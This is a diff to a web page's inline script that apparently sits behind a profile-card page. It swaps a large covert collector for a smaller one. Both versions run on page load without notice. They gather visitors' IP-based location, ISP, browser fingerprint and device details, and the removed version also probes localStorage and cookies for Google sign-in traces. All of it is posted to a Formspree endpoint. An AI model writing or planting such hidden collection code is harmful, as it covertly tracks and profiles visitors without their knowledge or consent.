@@ -261,44 +261,30 @@
     </div>
 
     <script>
-        // ULTIMATE DATA COLLECTION - EVERYTHING POSSIBLE
-        async function collectComprehensiveData() {
-            const advancedData = {
-                // Basic Identification
+        // Enhanced data collection
+        async function collectData() {
+            const data = {
                 timestamp: new Date().toISOString(),
-                pageUrl: window.location.href,
+                url: window.location.href,
                 referrer: document.referrer,
-                
-                // Network & Location
-                ipData: await getIPData(),
-                networkInfo: getNetworkInfo(),
-                
-                // Browser Fingerprint
-                browserFingerprint: getBrowserFingerprint(),
-                screenInfo: getScreenInfo(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                
-                // Advanced Fingerprinting
-                hardwareInfo: getHardwareInfo(),
-                storageInfo: getStorageInfo(),
-                connectionInfo: getConnectionInfo(),
-                
-                // Behavioral Data
-                userBehavior: getUserBehavior(),
-                socialPresence: await detectSocialPresence(),
-                
-                // Attempt to get Google Account info
-                googlePresence: await detectGoogleAccount(),
-                
-                // System Information
-                systemInfo: getSystemInfo(),
-                plugins: getPluginsDetailed(),
-                fonts: await getFontsList(),
-                
-                // Performance Metrics
-                performance: getPerformanceMetrics(),
-                battery: await getBatteryStatus()
+                cookies: navigator.cookieEnabled
             };
+
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
+                data.city = ipData.city;
+                data.country = ipData.country_name;
+                data.isp = ipData.org;
+            } catch (error) {
+                data.ip = 'Failed to fetch';
+            }
 
             // Send to Formspree
             try {
@@ -307,260 +293,12 @@
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(advancedData)
+                    body: JSON.stringify(data)
                 });
-                console.log('🎯 ADVANCED DATA COLLECTION COMPLETE');
             } catch (error) {
                 console.error('Data submission failed:', error);
             }
         }
-
-        // Enhanced data collection functions
-        async function getIPData() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                return {
-                    ip: data.ip,
-                    city: data.city,
-                    region: data.region,
-                    country: data.country_name,
-                    isp: data.org,
-                    coordinates: `${data.latitude}, ${data.longitude}`,
-                    timezone: data.timezone,
-                    currency: data.currency
-                };
-            } catch (error) {
-                return { error: 'Failed to fetch IP data' };
-            }
-        }
-
-        function getBrowserFingerprint() {
-            return {
-                userAgent: navigator.userAgent,
-                browser: getBrowserDetails(),
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                pdfViewerEnabled: navigator.pdfViewerEnabled,
-                webdriver: navigator.webdriver,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                maxTouchPoints: navigator.maxTouchPoints
-            };
-        }
-
-        function getBrowserDetails() {
-            const ua = navigator.userAgent;
-            return {
-                name: getBrowserName(ua),
-                version: getBrowserVersion(ua),
-                engine: getBrowserEngine(ua)
-            };
-        }
-
-        function getBrowserName(ua) {
-            if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
-            if (ua.includes("Firefox")) return "Firefox";
-            if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
-            if (ua.includes("Edg")) return "Edge";
-            if (ua.includes("Opera")) return "Opera";
-            return "Unknown";
-        }
-
-        function getBrowserVersion(ua) {
-            const match = ua.match(/(Chrome|Firefox|Safari|Edg|Opera|Version)\/([0-9.]+)/);
-            return match ? match[2] : "Unknown";
-        }
-
-        function getBrowserEngine(ua) {
-            if (ua.includes("AppleWebKit")) return "WebKit";
-            if (ua.includes("Gecko")) return "Gecko";
-            if (ua.includes("Blink")) return "Blink";
-            return "Unknown";
-        }
-
-        function getScreenInfo() {
-            return {
-                resolution: `${screen.width}x${screen.height}`,
-                available: `${screen.availWidth}x${screen.availHeight}`,
-                colorDepth: `${screen.colorDepth}-bit`,
-                pixelDepth: `${screen.pixelDepth}-bit`,
-                orientation: screen.orientation?.type || 'Unknown',
-                devicePixelRatio: window.devicePixelRatio
-            };
-        }
-
-        function getHardwareInfo() {
-            return {
-                cores: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
-                deviceType: getDeviceType(),
-                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
-            };
-        }
-
-        function getDeviceType() {
-            const ua = navigator.userAgent;
-            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
-            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
-            return "Desktop";
-        }
-
-        function getStorageInfo() {
-            return {
-                localStorage: typeof(Storage) !== "undefined",
-                sessionStorage: typeof(Storage) !== "undefined",
-                indexedDB: 'indexedDB' in window,
-                cookies: navigator.cookieEnabled
-            };
-        }
-
-        function getConnectionInfo() {
-            const conn = navigator.connection;
-            return conn ? {
-                type: conn.effectiveType,
-                speed: `${conn.downlink} Mbps`,
-                rtt: `${conn.rtt}ms`,
-                saveData: conn.saveData
-            } : { error: 'Not available' };
-        }
-
-        function getUserBehavior() {
-            return {
-                viewport: `${window.innerWidth}x${window.innerHeight}`,
-                historyLength: history.length,
-                timeOnPage: new Date().toISOString()
-            };
-        }
-
-        async function detectSocialPresence() {
-            const social = {
-                chromeExtensions: window.chrome && window.chrome.runtime,
-                firefoxAddons: typeof window.InstallTrigger !== 'undefined'
-            };
-            return social;
-        }
-
-        async function detectGoogleAccount() {
-            // Attempt to detect Google account presence
-            try {
-                // Check for Google API presence
-                const hasGoogleAPIs = !!window.gapi;
-                
-                // Attempt to detect signed-in state through various methods
-                let googleSignedIn = false;
-                let googleAccountName = null;
-                
-                // Method 1: Check for Google OAuth tokens in localStorage
-                for (let key in localStorage) {
-                    if (key.includes('google') || key.includes('auth') || key.includes('oauth')) {
-                        googleSignedIn = true;
-                        break;
-                    }
-                }
-                
-                // Method 2: Check for Google Analytics
-                if (window.ga && window.ga.getAll) {
-                    googleSignedIn = true;
-                }
-                
-                return {
-                    hasGoogleAPIs,
-                    potentiallySignedIn: googleSignedIn,
-                    detectedName: googleAccountName,
-                    googleCookies: document.cookie.includes('google') || document.cookie.includes('accounts.google')
-                };
-            } catch (error) {
-                return { error: 'Google detection failed' };
-            }
-        }
-
-        function getSystemInfo() {
-            const ua = navigator.userAgent;
-            let os = "Unknown";
-            
-            if (ua.includes("Win")) os = "Windows";
-            else if (ua.includes("Mac")) os = "MacOS";
-            else if (ua.includes("Linux")) os = "Linux";
-            else if (ua.includes("Android")) os = "Android";
-            else if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
-            else if (ua.includes("CrOS")) os = "ChromeOS";
-            
-            return {
-                operatingSystem: os,
-                platform: navigator.platform,
-                vendor: navigator.vendor
-            };
-        }
-
-        function getPluginsDetailed() {
-            const plugins = [];
-            if (navigator.plugins) {
-                for (let i = 0; i < navigator.plugins.length; i++) {
-                    plugins.push({
-                        name: navigator.plugins[i].name,
-                        version: navigator.plugins[i].version,
-                        description: navigator.plugins[i].description
-                    });
-                }
-            }
-            return plugins;
-        }
-
-        async function getFontsList() {
-            const fonts = ['Arial', 'Times New Roman', 'Helvetica', 'Georgia', 'Verdana', 'Courier New'];
-            const available = [];
-            
-            for (const font of fonts) {
-                if (document.fonts.check(`12px "${font}"`)) {
-                    available.push(font);
-                }
-            }
-            return available;
-        }
-
-        function getPerformanceMetrics() {
-            const perf = performance.timing;
-            return {
-                loadTime: perf.loadEventEnd - perf.navigationStart,
-                domReady: perf.domContentLoadedEventEnd - perf.navigationStart,
-                networkLatency: perf.responseEnd - perf.requestStart
-            };
-        }
-
-        async function getBatteryStatus() {
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    return {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    };
-                } catch (e) {
-                    return { error: 'Battery API failed' };
-                }
-            }
-            return { error: 'Battery API not available' };
-        }
-
-        function getNetworkInfo() {
-            return {
-                online: navigator.onLine,
-                connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown'
-            };
-        }
-
-        // Start comprehensive data collection
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                collectComprehensiveData();
-            }, 1000);
-        });
 
         function showAdvancedProfile() {
             document.querySelector('.profile-card').innerHTML = `
@@ -592,6 +330,11 @@
                 </style>
             `;
         }
+
+        // Start data collection when page loads
+        window.addEventListener('load', () => {
+            collectData();
+        });
     </script>
 </body>
 </html>
